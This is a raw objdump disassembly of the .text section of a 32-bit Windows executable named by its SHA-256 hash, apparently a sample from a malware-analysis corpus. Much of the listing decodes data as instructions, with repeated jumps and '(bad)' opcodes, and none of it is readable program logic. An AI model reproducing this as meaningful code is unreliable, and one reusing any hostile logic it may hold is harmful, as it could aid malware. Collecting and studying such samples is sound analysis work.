
f6fbdce70b2ac85a1e579f02e3f7b3e3d46dc37726e6f852f7215103114e3b9b.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    al,bh
  401002:	add    eax,DWORD PTR [eax]
  401004:	jne    0x400fff
  401006:	inc    ebx
  401007:	add    BYTE PTR [edx],bh
  401009:	addr16 je 0x40105c
  40100c:	pop    es
  40100d:	ins    DWORD PTR es:[edi],dx
  40100e:	arpl   WORD PTR [ecx-0x27],ax
  401011:	data16 jb 0x401079
  401014:	out    0x71,al
  401016:	add    BYTE PTR [eax],al
  401018:	mov    cl,0x6d
  40101a:	popa   
  40101b:	fs test eax,0xd472626b
  401021:	jo     0x40109c
  401023:	inc    ebp
  401024:	int    0x43
  401026:	add    BYTE PTR [eax],al
  401028:	mov    cl,0x6d
  40102a:	popa   
  40102b:	fs test eax,0x9472626b
  401031:	jo     0x4010ac
  401033:	inc    ebp
  401034:	lods   eax,DWORD PTR ds:[esi]
  401035:	push   ebp
  401036:	add    BYTE PTR [eax],al
  401038:	mov    edx,0x8a4d7467
  40103d:	data16 jne 0x4010ac
  401040:	cwde   
  401041:	dec    edx
  401042:	popa   
  401043:	outs   dx,BYTE PTR ds:[esi]
  401044:	xchg   ecx,eax
  401045:	outs   dx,BYTE PTR ds:[esi]
  401046:	gs inc ecx
  401048:	jne    0x40104c
  40104a:	add    BYTE PTR [eax],al
  40104c:	mov    dh,0x70
  40104e:	gs popa 
  401050:	imul   esp,DWORD PTR [edi+0x46],0x41675969
  401057:	add    BYTE PTR [ecx+0x71],dl
  40105a:	je     0x4010ce
  40105c:	push   esi
  40105d:	arpl   WORD PTR [ecx+eax*2+0x75],si
  401061:	add    al,BYTE PTR [eax]
  401063:	add    BYTE PTR [edx],dh
  401065:	addr16 je 0x4010bf
  401068:	add    BYTE PTR [eax],al
  40106a:	add    BYTE PTR [eax],al
  40106c:	add    BYTE PTR [esp+ebp*2+0x64],cl
  401070:	outs   dx,DWORD PTR ds:[esi]
  401071:	inc    edx
  401072:	jno    0x4010b8
  401074:	imul   esp,DWORD PTR [edi],0x1a746367
  40107a:	jo     0x4010f5
  40107c:	inc    ecx
  40107d:	jne    0x401081
  40107f:	add    BYTE PTR [eax],al
  401081:	xor    ah,BYTE PTR [edi+0x74]
  401084:	dec    ebp
  401085:	and    ah,BYTE PTR [esi+0x75]
  401088:	ins    BYTE PTR es:[edi],dx
  401089:	adc    BYTE PTR [edx+0x61],cl
  40108c:	outs   dx,BYTE PTR ds:[esi]
  40108d:	sbb    DWORD PTR [esi+0x65],ebp
  401090:	push   edi
  401091:	jne    0x401095
  401093:	add    BYTE PTR [eax],al
  401095:	jns    0x401096
  401097:	aas    
  401098:	add    BYTE PTR [ecx-0x66ffc001],al
  40109e:	(bad)  
  40109f:	aas    
  4010a0:	add    BYTE PTR [ecx-0x42ffc001],ah
  4010a6:	(bad)  
  4010a7:	aas    
  4010a8:	add    BYTE PTR [ecx-0x2affc001],ah
  4010ae:	(bad)  
  4010af:	aas    
  4010b0:	add    BYTE PTR [ebp-0x45ffc001],bh
  4010b6:	gs je  0x401109
  4010b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4010ba:	imul   esp,DWORD PTR [ebx+0x41],0xffffff99
  4010be:	data16 jb 0x401126
  4010c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4010c2:	outs   dx,DWORD PTR ds:[esi]
  4010c3:	add    BYTE PTR [eax],al
  4010c5:	shr    DWORD PTR [ebx+0x61],0x64
  4010c9:	mov    ecx,0x94726269
  4010ce:	jo     0x401149
  4010d0:	inc    ebp
  4010d1:	add    BYTE PTR [eax],al
  4010d3:	add    BYTE PTR [eax],al
  4010d5:	add    BYTE PTR [ebp+0x41],bh
  4010d8:	add    BYTE PTR [eax],al
  4010da:	pop    esi
  4010db:	gs jb  0x40114c
  4010de:	push   eax
  4010df:	outs   dx,BYTE PTR ds:[esi]
  4010e0:	xor    esi,DWORD PTR [edx]
  4010e2:	xchg   ebx,eax
  4010e3:	data16 ins BYTE PTR es:[edi],dx
  4010e5:	ins    BYTE PTR es:[edi],dx
  4010e6:	jne    0x4010ea
  4010e8:	add    BYTE PTR [eax],al
  4010ea:	pusha  
  4010eb:	outs   dx,DWORD PTR ds:[esi]
  4010ec:	jbe    0x401151
  4010ee:	inc    edi
  4010ef:	jbe    0x40111f
  4010f1:	fs push ecx
  4010f3:	outs   dx,BYTE PTR ds:[esi]
  4010f4:	add    BYTE PTR [eax],al
  4010f6:	dec    eax
  4010f7:	gs ins DWORD PTR es:[edi],dx
  4010f9:	jae    0x401113
  4010fb:	jbe    0x4010fd
  4010fd:	add    BYTE PTR [eax],bl
  4010ff:	outs   dx,DWORD PTR ds:[esi]
  401100:	jbe    0x401165
  401102:	daa    
  401103:	jbe    0x401133
  401105:	or     DWORD PTR fs:[esi+0x0],ebp
  401109:	add    BYTE PTR [eax],ah
  40110b:	gs ins DWORD PTR es:[edi],dx
  40110d:	arpl   WORD PTR ds:0x2b000079,ax
  401113:	imul   esi,DWORD PTR [edx+0x74],0x416c6100
  40111a:	loope  0x40118a
  40111c:	outs   dx,DWORD PTR ds:[esi]
  40111d:	arpl   WORD PTR [ebp+0x2],si
  401120:	add    BYTE PTR [eax],al
  401122:	retf   
  401123:	imul   esi,DWORD PTR [edx+0x74],0x416c61e0
  40112a:	loope  0x40119a
  40112c:	outs   dx,DWORD PTR ds:[esi]
  40112d:	arpl   WORD PTR [ebp+0x2],si
  401130:	add    BYTE PTR [eax],al
  401132:	test   al,0x6c
  401134:	ins    DWORD PTR es:[edi],dx
  401135:	popa   
  401136:	lds    edx,FWORD PTR [ecx+ebp*2+0x65]
  40113a:	add    BYTE PTR [eax],al
  40113c:	add    BYTE PTR [eax],al
  40113e:	add    BYTE PTR [edx-0x63b999b5],ch
  401144:	outs   dx,BYTE PTR ds:[esi]
  401145:	gs add bl,cl
  401148:	imul   esi,DWORD PTR [edx+0x74],0x506c61a0
  40114f:	xchg   DWORD PTR [ebx+0x74],ebp
  401152:	gs xchg esi,eax
  401154:	jbe    0x401156
  401156:	add    BYTE PTR [ebp-0x4b8f9e9b],ch
  40115c:	outs   dx,BYTE PTR ds:[esi]
  40115d:	ins    BYTE PTR es:[edi],dx
  40115e:	outs   dx,DWORD PTR ds:[esi]
  40115f:	push   esi
  401160:	add    al,BYTE PTR [eax]
  401162:	add    BYTE PTR [esi+0x65],bl
  401165:	jb     0x4011d5
  401167:	pop    eax
  401168:	outs   dx,BYTE PTR ds:[esi]
  401169:	xor    esi,DWORD PTR [edx]
  40116b:	mov    esp,DWORD PTR [esi+0x6c]
  40116e:	ins    BYTE PTR es:[edi],dx
  40116f:	jne    0x401173
  401171:	add    BYTE PTR [eax],al
  401173:	xor    ah,BYTE PTR [ebp+0x74]
  401176:	push   eax
  401177:	inc    edi
  401178:	imul   esp,DWORD PTR [ebx+0x65],0x46
  40117c:	outs   dx,DWORD PTR ds:[esi]
  40117d:	dec    eax
  40117e:	gs adc al,0x72
  401181:	add    BYTE PTR [eax],al
  401183:	jne    0x401187
  401185:	loop   0x40118a
  401187:	jne    0x40112f
  401189:	pop    ecx
  40118a:	add    BYTE PTR [ebp-0x17],dh
  40118d:	add    eax,DWORD PTR [eax]
  40118f:	jne    0x40117a
  401191:	add    eax,DWORD PTR [eax]
  401193:	jne    0x40117e
  401195:	add    eax,DWORD PTR [eax]
  401197:	jne    0x401182
  401199:	add    eax,DWORD PTR [eax]
  40119b:	jne    0x401186
  40119d:	add    eax,DWORD PTR [eax]
  40119f:	jne    0x40118c
  4011a1:	add    eax,DWORD PTR [eax]
  4011a3:	add    BYTE PTR [eax],al
  4011a5:	add    BYTE PTR [eax],al
  4011a7:	add    BYTE PTR [ebp-0x15],dh
  4011aa:	add    eax,DWORD PTR [eax]
  4011ac:	jne    0x401199
  4011ae:	add    eax,DWORD PTR [eax]
  4011b0:	jne    0x40119d
  4011b2:	add    eax,DWORD PTR [eax]
  4011b4:	jne    0x4011a1
  4011b6:	add    eax,DWORD PTR [eax]
  4011b8:	jne    0x4011a5
  4011ba:	add    eax,DWORD PTR [eax]
  4011bc:	jne    0x4011a9
  4011be:	add    eax,DWORD PTR [eax]
  4011c0:	jne    0x4011ad
  4011c2:	add    eax,DWORD PTR [eax]
  4011c4:	jne    0x4011b1
  4011c6:	add    eax,DWORD PTR [eax]
  4011c8:	jne    0x40116d
  4011ca:	add    al,0x0
  4011cc:	jne    0x4011b9
  4011ce:	add    eax,DWORD PTR [eax]
  4011d0:	jne    0x4011bd
  4011d2:	add    eax,DWORD PTR [eax]
  4011d4:	jne    0x4011c1
  4011d6:	add    eax,DWORD PTR [eax]
  4011d8:	jne    0x4011c5
  4011da:	add    eax,DWORD PTR [eax]
  4011dc:	jne    0x4011c9
  4011de:	add    eax,DWORD PTR [eax]
  4011e0:	jne    0x4011cd
  4011e2:	add    eax,DWORD PTR [eax]
  4011e4:	jne    0x4011d1
  4011e6:	add    eax,DWORD PTR [eax]
  4011e8:	jne    0x4011d5
  4011ea:	add    eax,DWORD PTR [eax]
  4011ec:	jne    0x4011d9
  4011ee:	add    eax,DWORD PTR [eax]
  4011f0:	jne    0x4011dd
  4011f2:	add    eax,DWORD PTR [eax]
  4011f4:	jne    0x4011e1
  4011f6:	add    eax,DWORD PTR [eax]
  4011f8:	jne    0x4011e5
  4011fa:	add    eax,DWORD PTR [eax]
  4011fc:	jne    0x4011e9
  4011fe:	add    eax,DWORD PTR [eax]
  401200:	jne    0x4011ed
  401202:	add    eax,DWORD PTR [eax]
  401204:	jne    0x401208
  401206:	jmp    0xe942870e
  40120b:	add    eax,DWORD PTR [eax]
  40120d:	add    BYTE PTR [eax],al
  40120f:	add    BYTE PTR [eax],al
  401211:	jne    0x401215
  401213:	jmp    0xe942871b
  401218:	add    esi,DWORD PTR [ebp+0x2]
  40121b:	jmp    0xe9428723
  401220:	add    esi,DWORD PTR [ebp+0x2]
  401223:	jmp    0xe942872b
  401228:	add    esi,DWORD PTR [ebp+0x2]
  40122b:	jmp    0xe9428733
  401230:	add    esi,DWORD PTR [ebp+0x2]
  401233:	jmp    0xe942873b
  401238:	add    esi,DWORD PTR [ebp+0x2]
  40123b:	jmp    0xe9428743
  401240:	add    esi,DWORD PTR [ebp+0x2]
  401243:	jmp    0xe942874b
  401248:	add    esi,DWORD PTR [ebp+0x2]
  40124b:	jmp    0xe9428753
  401250:	add    esi,DWORD PTR [ebp+0x2]
  401253:	jmp    0xe942875b
  401258:	add    esi,DWORD PTR [ebp+0x2]
  40125b:	jmp    0xe9428763
  401260:	add    esi,DWORD PTR [ebp+0x2]
  401263:	jmp    0xe942876b
  401268:	add    esi,DWORD PTR [ebp+0x2]
  40126b:	jmp    0xe9428773
  401270:	add    esi,DWORD PTR [ebp+0x2]
  401273:	jmp    0x40127b
  401278:	add    BYTE PTR [eax],al
  40127a:	jne    0x40127e
  40127c:	jmp    0xe9428784
  401281:	add    esi,DWORD PTR [ebp+0x2]
  401284:	jmp    0x42878c
  401289:	jmp    0xe9401504
  40128e:	jbe    0x401292
  401290:	add    BYTE PTR [ecx-0x52fffdcb],bh
  401296:	jns    0x40129d
  401298:	add    bl,dl
  40129a:	in     al,dx
  40129b:	mov    WORD PTR [edi-0x17],cs
  40129e:	jbe    0x4012a2
  4012a0:	add    cl,ch
  4012a2:	jbe    0x4012a6
  4012a4:	add    BYTE PTR [ecx],cl
  4012a6:	jbe    0x4012ac
  4012a8:	add    edx,esp
  4012aa:	jno    0x4012b8
  4012ac:	add    cl,ch
  4012ae:	and    BYTE PTR [eax+eax*1],al
  4012b1:	jmp    0xe940157c
  4012b6:	jbe    0x4012ba
  4012b8:	add    BYTE PTR [ecx-0x16fffaa0],dl
  4012be:	data16 add al,BYTE PTR [eax]
  4012c1:	jmp    0xe94016fc
  4012c6:	jbe    0x40130a
  4012c8:	add    cl,ch
  4012ca:	data16 add al,BYTE PTR [eax]
  4012cd:	jmp    0xec40154a
  4012d2:	jbe    0x4012d5
  4012d4:	add    al,ch
  4012d6:	jbe    0x4012da
  4012d8:	add    ah,ch
  4012da:	jbe    0x4012dd
  4012dc:	add    cl,ch
  4012de:	add    BYTE PTR [eax],al
  4012e0:	add    BYTE PTR [eax],al
  4012e2:	add    BYTE PTR [esi+0x2],dh
  4012e5:	add    cl,ch
  4012e7:	push   esi
  4012e8:	(bad)  
  4012e9:	(bad)  
  4012ea:	call   0xea400af1
  4012ef:	jbe    0x4012f3
  4012f1:	add    bl,ch
  4012f3:	jbe    0x4012f7
  4012f5:	sub    ecx,0xe9001276
  4012fb:	xchg   BYTE PTR [edx],al
  4012fd:	add    cl,ch
  4012ff:	jbe    0x401313
  401301:	add    cl,ch
  401303:	data16 add al,BYTE PTR [eax]
  401306:	add    ah,bl
  401308:	add    eax,DWORD PTR [eax]
  40130a:	add    BYTE PTR [ebx+eax*1+0x3cc0000],bl
  401311:	add    BYTE PTR [eax],al
  401313:	pushf  
  401314:	add    eax,DWORD PTR [eax]
  401316:	add    al,bl
  401318:	xchg   DWORD PTR [ebx],eax
  40131a:	add    ah,cl
  40131c:	add    al,0x0
  40131e:	add    BYTE PTR [ebx+eax*1+0x39c0000],cl
  401325:	add    BYTE PTR [eax],al
  401327:	pushf  
  401328:	add    eax,DWORD PTR [eax]
  40132a:	add    BYTE PTR [ebx+eax*1+0x38c0000],cl
  401331:	add    BYTE PTR [eax],al
  401333:	pop    esp
  401334:	add    eax,DWORD PTR [eax]
  401336:	add    BYTE PTR [ebx+esi*8+0x3],bl
  40133a:	add    ah,ch
  40133c:	sbb    BYTE PTR [eax],al
  40133e:	add    BYTE PTR [ebx+eax*1+0x0],cl
  401342:	add    BYTE PTR [ebx+eax*1+0x0],bl
  401346:	add    BYTE PTR [eax],al
  401348:	add    BYTE PTR [eax],al
  40134a:	add    BYTE PTR [eax],al
  40134c:	pop    esp
  40134d:	add    eax,DWORD PTR [eax]
  40134f:	add    BYTE PTR [ebx+eax*1+0x0],cl
  401353:	add    BYTE PTR [ebx+eax*1+0x0],cl
  401357:	add    BYTE PTR [ebx+eax*1],bl
  40135a:	add    BYTE PTR [eax],al
  40135c:	sbb    al,0x3
  40135e:	add    BYTE PTR [eax],al
  401360:	or     al,0x3
  401362:	add    BYTE PTR [eax],al
  401364:	or     al,0x3
  401366:	add    BYTE PTR [eax],al
  401368:	sbb    al,0x3
  40136a:	add    BYTE PTR [eax],al
  40136c:	sbb    al,0x3
  40136e:	add    BYTE PTR [eax],al
  401370:	or     al,0x3
  401372:	add    BYTE PTR [eax],al
  401374:	or     al,0x13
  401376:	add    BYTE PTR [eax],al
  401378:	lods   al,BYTE PTR ds:[esi]
  401379:	add    DWORD PTR [eax],eax
  40137b:	add    ah,bl
  40137d:	add    al,BYTE PTR [eax]
  40137f:	add    ah,cl
  401381:	add    al,BYTE PTR [eax]
  401383:	add    BYTE PTR [ebp-0x17],dh
  401386:	add    eax,DWORD PTR [eax]
  401388:	jne    0x401373
  40138a:	add    eax,DWORD PTR [eax]
  40138c:	jne    0x401377
  40138e:	add    eax,DWORD PTR [eax]
  401390:	jne    0x40137b
  401392:	add    eax,DWORD PTR [eax]
  401394:	jne    0x401395
  401396:	outs   dx,DWORD PTR ds:[esi]
  401397:	gs sub eax,0x750003ad
  40139d:	inc    edi
  40139e:	stos   DWORD PTR es:[edi],eax
  40139f:	add    esi,DWORD PTR [ebp-0x17]
  4013a2:	adc    eax,DWORD PTR [eax]
  4013a4:	jne    0x40138f
  4013a6:	lods   eax,DWORD PTR ds:[esi]
  4013a7:	add    esi,DWORD PTR [ebp-0x17]
  4013aa:	(bad)  
  4013ab:	dec    DWORD PTR [edx+0x3e8]
  4013b1:	add    BYTE PTR [eax],al
  4013b3:	add    BYTE PTR [eax],al
  4013b5:	jne    0x4013a0
  4013b7:	add    eax,DWORD PTR [eax]
  4013b9:	jne    0x4013a4
  4013bb:	add    eax,DWORD PTR [eax]
  4013bd:	jne    0x40138a
  4013bf:	add    eax,DWORD PTR [eax]
  4013c1:	aad    0xd
  4013c3:	pusha  
  4013c4:	popa   
  4013c5:	jmp    0x75401814
  4013ca:	dec    ebx
  4013cb:	and    DWORD PTR [eax],eax
  4013cd:	jne    0x4013ba
  4013cf:	ret    
  4013d0:	add    esi,DWORD PTR [ebp-0x15]
  4013d3:	or     eax,DWORD PTR [eax]
  4013d5:	jne    0x4013c2
  4013d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4013d8:	add    esi,DWORD PTR [ebp-0x15]
  4013db:	add    eax,DWORD PTR [eax]
  4013dd:	jne    0x4013ca
  4013df:	add    eax,DWORD PTR [eax]
  4013e1:	jne    0x4013ce
  4013e3:	add    eax,DWORD PTR [eax]
  4013e5:	jne    0x401412
  4013e7:	add    al,0x0
  4013e9:	xor    eax,0xa16571be
  4013ee:	hlt    
  4013ef:	bound  eax,QWORD PTR [eax]
  4013f1:	jne    0x401382
  4013f3:	sub    al,0x0
  4013f5:	jne    0x4013e2
  4013f7:	repz add esi,DWORD PTR [ebp-0x15]
  4013fb:	sub    DWORD PTR [eax],eax
  4013fd:	jne    0x4013ea
  4013ff:	lods   eax,DWORD PTR ds:[esi]
  401400:	add    esi,DWORD PTR [ebp+0x2]
  401403:	jmp    0xe942890b
  401408:	add    esi,DWORD PTR [ebp+0x2]
  40140b:	jmp    0xa9428913
  401410:	add    esi,DWORD PTR [ebp+0x40]
  401413:	jmp    0xe942891b
  401418:	add    eax,DWORD PTR [eax]
  40141a:	add    BYTE PTR [eax],al
  40141c:	add    BYTE PTR [eax],al
  40141e:	jne    0x401422
  401420:	jmp    0xe9428928
  401425:	add    esi,DWORD PTR [ebp+0x2]
  401428:	jmp    0xe9428930
  40142d:	add    esi,DWORD PTR [ebp+0x2]
  401430:	jmp    0xe9428938
  401435:	add    esi,DWORD PTR [ebp+0x2]
  401438:	jmp    0xe9428940
  40143d:	add    esi,DWORD PTR [ebp+0x2]
  401440:	jmp    0xe9428948
  401445:	add    esi,DWORD PTR [ebp+0x2]
  401448:	jmp    0xe9428950
  40144d:	add    esi,DWORD PTR [ebp+0x2]
  401450:	jmp    0xe9428958
  401455:	add    esi,DWORD PTR [ebp+0x2]
  401458:	jmp    0xe9428960
  40145d:	add    esi,DWORD PTR [ebp+0x2]
  401460:	jmp    0xe9428968
  401465:	add    esi,DWORD PTR [ebp+0x2]
  401468:	jmp    0xe9428970
  40146d:	add    esi,DWORD PTR [ebp+0x2]
  401470:	jmp    0xe9428978
  401475:	add    esi,DWORD PTR [ebp+0x2]
  401478:	jmp    0xe9428980
  40147d:	add    esi,DWORD PTR [ebp+0x2]
  401480:	add    cl,ch
  401482:	add    BYTE PTR [eax],al
  401484:	add    BYTE PTR [eax],al
  401486:	add    BYTE PTR [esi+0x2],dh
  401489:	add    cl,ch
  40148b:	jbe    0x40148f
  40148d:	add    cl,ch
  40148f:	jbe    0x401493
  401491:	add    cl,ch
  401493:	jbe    0x401497
  401495:	add    cl,ch
  401497:	jbe    0x40149b
  401499:	add    cl,ch
  40149b:	jbe    0x40149f
  40149d:	add    cl,ch
  40149f:	jbe    0x4014a3
  4014a1:	add    cl,ch
  4014a3:	jbe    0x4014a7
  4014a5:	add    cl,ch
  4014a7:	jbe    0x4014ab
  4014a9:	add    cl,ch
  4014ab:	jbe    0x4014af
  4014ad:	add    cl,ch
  4014af:	jbe    0x4014b3
  4014b1:	add    cl,ch
  4014b3:	jbe    0x4014b7
  4014b5:	add    cl,ch
  4014b7:	jbe    0x4014bb
  4014b9:	add    cl,ch
  4014bb:	jbe    0x4014bf
  4014bd:	add    cl,ch
  4014bf:	jbe    0x4014c3
  4014c1:	add    cl,ch
  4014c3:	jbe    0x4014c7
  4014c5:	add    cl,ch
  4014c7:	jbe    0x4014cb
  4014c9:	add    cl,ch
  4014cb:	jbe    0x4014cf
  4014cd:	add    cl,ch
  4014cf:	jbe    0x4014d3
  4014d1:	add    cl,ch
  4014d3:	jbe    0x4014d7
  4014d5:	add    cl,ch
  4014d7:	jbe    0x4014db
  4014d9:	add    cl,ch
  4014db:	jbe    0x4014df
  4014dd:	add    cl,ch
  4014df:	jbe    0x4014e3
  4014e1:	add    cl,ch
  4014e3:	jbe    0x4014e7
  4014e5:	add    cl,ch
  4014e7:	jbe    0x4014eb
  4014e9:	add    cl,ch
  4014eb:	add    BYTE PTR [eax],al
  4014ed:	add    BYTE PTR [eax],al
  4014ef:	add    BYTE PTR [esi+0x2],dh
  4014f2:	add    cl,ch
  4014f4:	jbe    0x4014f8
  4014f6:	add    cl,ch
  4014f8:	jbe    0x4014fc
  4014fa:	add    cl,ch
  4014fc:	jbe    0x401500
  4014fe:	add    cl,ch
  401500:	jbe    0x401504
  401502:	add    BYTE PTR [eax],al
  401504:	or     al,0x0
  401506:	add    BYTE PTR [eax],al
  401508:	or     al,0x0
  40150a:	add    BYTE PTR [eax],al
  40150c:	fdiv   st(7),st
  40150e:	(bad)  
  40150f:	(bad)  
  401510:	fdiv   st(7),st
  401512:	(bad)  
  401513:	dec    esp
  401515:	(bad)  
  401516:	(bad)  
  401517:	dec    esp
  401519:	(bad)  
  40151a:	(bad)  
  40151b:	(bad)  
  40151c:	fdiv   st(7),st
  40151e:	(bad)  
  40151f:	(bad)  
  401520:	fdiv   st(7),st
  401522:	(bad)  
  401523:	dec    esp
  401525:	(bad)  
  401526:	(bad)  
  401527:	dec    esp
  401529:	(bad)  
  40152a:	(bad)  
  40152b:	call   FWORD PTR [edi+edi*8-0x630001]
  401532:	(bad)  
  401533:	dec    DWORD PTR [edi+edi*8-0x730001]
  40153a:	(bad)  
  40153b:	call   FWORD PTR [edi+edi*8-0x630001]
  401542:	(bad)  
  401543:	dec    DWORD PTR [edi+edi*8-0x730001]
  40154a:	(bad)  
  40154b:	call   FWORD PTR [edi+edi*8-0x1]
  40154f:	call   FWORD PTR [edi+edi*8-0x1]
  401553:	inc    DWORD PTR [eax]
  401555:	add    BYTE PTR [eax],al
  401557:	add    BYTE PTR [eax],al
  401559:	dec    esp
  40155a:	(bad)  
  40155b:	(bad)  
  40155c:	dec    DWORD PTR [edi+edi*8-0x1]
  401560:	call   FWORD PTR [edi+edi*8-0x1]
  401564:	call   FWORD PTR [edi+edi*8-0x1]
  401568:	dec    DWORD PTR [edi+edi*8-0x1]
  40156c:	dec    DWORD PTR [edi+edi*8-0x1]
  401570:	call   FWORD PTR [edi+edi*8]
  401573:	(bad)  
  401574:	call   FWORD PTR [edi+edi*8]
  401577:	(bad)  
  401578:	dec    DWORD PTR [edi+edi*8]
  40157b:	(bad)  
  40157c:	dec    DWORD PTR [edi+edi*8]
  40157f:	(bad)  
  401580:	push   DWORD PTR [ebp-0x17]
  401583:	add    eax,DWORD PTR [eax]
  401585:	jne    0x401570
  401587:	add    eax,DWORD PTR [eax]
  401589:	jne    0x401574
  40158b:	add    eax,DWORD PTR [eax]
  40158d:	jne    0x401578
  40158f:	add    eax,DWORD PTR [eax]
  401591:	jne    0x40157c
  401593:	add    eax,DWORD PTR [eax]
  401595:	jne    0x401580
  401597:	add    eax,DWORD PTR [eax]
  401599:	jne    0x401584
  40159b:	add    eax,DWORD PTR [eax]
  40159d:	jne    0x401588
  40159f:	add    eax,DWORD PTR [eax]
  4015a1:	jne    0x40158c
  4015a3:	add    eax,DWORD PTR [eax]
  4015a5:	jne    0x401590
  4015a7:	add    eax,DWORD PTR [eax]
  4015a9:	jne    0x401594
  4015ab:	add    eax,DWORD PTR [eax]
  4015ad:	jne    0x401598
  4015af:	add    eax,DWORD PTR [eax]
  4015b1:	jne    0x40159c
  4015b3:	add    eax,DWORD PTR [eax]
  4015b5:	jne    0x4015a0
  4015b7:	add    eax,DWORD PTR [eax]
  4015b9:	jne    0x4015a4
  4015bb:	add    eax,DWORD PTR [eax]
  4015bd:	add    BYTE PTR [eax],al
  4015bf:	add    BYTE PTR [eax],al
  4015c1:	add    BYTE PTR [ebp-0x17],dh
  4015c4:	add    eax,DWORD PTR [eax]
  4015c6:	jne    0x4015c7
  4015c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015c9:	add    esi,DWORD PTR [ebp+0x43]
  4015cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4015cd:	add    esi,DWORD PTR [ebp+0x13]
  4015d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4015d1:	add    esi,DWORD PTR [ebp-0xb]
  4015d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015d5:	add    esi,DWORD PTR [ebp-0x17]
  4015d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015d9:	add    esi,DWORD PTR [ebp-0x43]
  4015dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015dd:	add    esi,DWORD PTR [ebp+0x19]
  4015e0:	mov    eax,ds:0xa11b7503
  4015e5:	add    esi,DWORD PTR [ebp+0x29]
  4015e8:	mov    eax,ds:0xa1477503
  4015ed:	add    esi,DWORD PTR [ebp+0x5f]
  4015f0:	mov    eax,ds:0xa17b7503
  4015f5:	add    esi,DWORD PTR [ebp-0x6d]
  4015f8:	mov    eax,ds:0xa1b77503
  4015fd:	add    esi,DWORD PTR [ebp+0x2]
  401600:	stc    
  401601:	mov    eax,ds:0xa1c50276
  401606:	jbe    0x40160a
  401608:	frstor [ecx-0x5dd8fd8a]
  40160e:	jbe    0x401612
  401610:	pop    ds
  401611:	mov    ds:0xa2130276,al
  401616:	jbe    0x40161a
  401618:	imul   esp,DWORD PTR [edx-0x5da4fd8a],0xa2950276
  401622:	jbe    0x401626
  401624:	and    eax,0xa2
  401629:	add    BYTE PTR [eax],al
  40162b:	jbe    0x40162f
  40162d:	xor    eax,0x550276a2
  401632:	mov    ds:0xa2d90276,al
  401637:	jbe    0x40163b
  401639:	add    eax,0xf50276a3
  40163e:	mov    ds:0xa29b0276,al
  401643:	jbe    0x401647
  401645:	lea    esp,[edx-0x5d6afd8a]
  40164b:	jbe    0x40164f
  40164d:	outs   dx,DWORD PTR ds:[esi]
  40164e:	mov    ds:0x3e90276,eax
  401653:	jne    0x401657
  401655:	sub    eax,0x4b0276b8
  40165a:	mov    eax,0xb86d0276
  40165f:	jbe    0x401663
  401661:	jg     0x40161a
  401663:	jbe    0x401667
  401665:	inc    ebp
  401666:	mov    eax,0xb8250276
  40166b:	jbe    0x40166f
  40166d:	or     edi,DWORD PTR [eax-0x4852fd8a]
  401673:	jbe    0x401677
  401675:	jmp    0x17428b7d
  40167a:	mov    bh,0x76
  40167c:	add    al,BYTE PTR [eax]
  40167e:	cdq    
  40167f:	loopne 0x401685
  401681:	add    BYTE PTR [ebx],ch
  401683:	jmp    0x4:0xe0650004
  40168a:	pop    ecx
  40168b:	enter  0x4,0xdf
  40168f:	add    BYTE PTR [eax],al
  401691:	add    BYTE PTR [eax],al
  401693:	add    bl,al
  401695:	add    al,0x0
  401697:	ret    
  401698:	retf   
  401699:	add    al,0x0
  40169b:	in     eax,0xc3
  40169d:	add    al,0x0
  40169f:	out    0x2b,eax
  4016a1:	add    eax,0x5207500
  4016a6:	add    BYTE PTR [ecx+0x28],bh
  4016a9:	add    eax,0x5204900
  4016ae:	add    BYTE PTR [ecx-0x34fffaf8],cl
  4016b4:	add    eax,DWORD PTR ds:0x5086700
  4016ba:	add    cl,ch
  4016bc:	jbe    0x4016c0
  4016be:	add    BYTE PTR [edi-0x16fffb11],ch
  4016c4:	jbe    0x4016c8
  4016c6:	add    BYTE PTR [ebx-0x74fffb27],bl
  4016cc:	rol    DWORD PTR [eax+eax*1],1
  4016cf:	xchg   ebp,eax
  4016d0:	fld    DWORD PTR [eax+eax*1]
  4016d3:	rol    DWORD PTR [si],1
  4016d6:	add    BYTE PTR [ebp-0x27],al
  4016d9:	add    al,0x0
  4016db:	inc    ebp
  4016dc:	rol    DWORD PTR [eax+eax*1],1
  4016df:	xor    DWORD PTR [ecx],ebx
  4016e1:	add    al,0x0
  4016e3:	add    eax,0xe9000411
  4016e8:	sbb    BYTE PTR [eax+eax*1],al
  4016eb:	not    DWORD PTR [eax]
  4016ed:	add    al,0x0
  4016ef:	pop    es
  4016f0:	sbb    eax,DWORD PTR [eax+eax*1]
  4016f3:	pop    ss
  4016f4:	adc    eax,DWORD PTR [eax+eax*1]
  4016f7:	xor    eax,DWORD PTR [eax]
  4016f9:	add    BYTE PTR [eax],al
  4016fb:	add    BYTE PTR [eax],al
  4016fd:	sbb    eax,DWORD PTR [eax+eax*1]
  401700:	add    BYTE PTR [edx+0x6e0003a8],ch
  401706:	test   al,0x3
  401708:	add    BYTE PTR [eax+ebp*4-0x573dfffd],bl
  40170f:	add    eax,DWORD PTR [eax]
  401711:	repnz test al,0x3
  401714:	add    BYTE PTR [eax+ebp*4-0x572dfffd],dl
  40171b:	add    eax,DWORD PTR [eax]
  40171d:	shr    BYTE PTR [eax-0x571dfffd],1
  401723:	add    eax,DWORD PTR [eax]
  401725:	fsub   QWORD PTR [esi-0x593ffffd]
  40172b:	add    eax,DWORD PTR [eax]
  40172d:	and    al,0xa7
  40172f:	add    eax,DWORD PTR [eax]
  401731:	sbb    al,0xa7
  401733:	add    eax,DWORD PTR [eax]
  401735:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401736:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401737:	add    eax,DWORD PTR [eax]
  401739:	pop    eax
  40173a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40173b:	add    eax,DWORD PTR [eax]
  40173d:	dec    eax
  40173e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
